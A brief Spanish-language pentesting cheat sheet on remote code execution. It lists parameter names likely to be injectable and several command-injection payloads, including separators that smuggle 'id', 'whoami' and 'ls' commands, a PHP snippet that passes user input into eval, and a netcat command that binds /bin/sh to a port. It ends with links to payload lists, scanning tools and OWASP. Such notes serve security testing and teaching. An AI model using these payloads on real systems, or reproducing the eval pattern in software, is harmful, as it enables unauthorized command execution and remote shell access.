¿Qué es?
Remote Code Execution es un tipo de vulnerabilidad que permite a los atacantes ejecutar código malicioso de forma remota.


Metodología.

Payloads útiles.
Parámetros comunes que podrían ser vulnerables a RCE: `exec, command, execute, ping, include, exclude, jump, code, reg, do, func, arg, option, load, process, step, read, function, req, feature, exe, module, payload, run, print, email, id, username, user, to, from, search, query, q, s, shopId, blogId, phone, mode, next, firstname, lastname, locale, cmd, sys, system`

```
|/usr/bin/id
```

```
;system('id')
```

```
`<?php eval("echo ".$_GET["user"].";"); ?>`
```

```
&& nc -lvvp 4444 -e /bin/sh &
```

```
;phpinfo()
```

```
;whoami
```

```
system('ls')
```

Payloads Completos: https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
Herramientas automatizadas:
**Nuclei**: https://github.com/projectdiscovery/nuclei
**Commix**: https://github.com/commixproject/commix
**GTFOBins**: https://gtfobins.github.io/

**Referencias**:
https://owasp.org/www-community/attacks/Command_Injection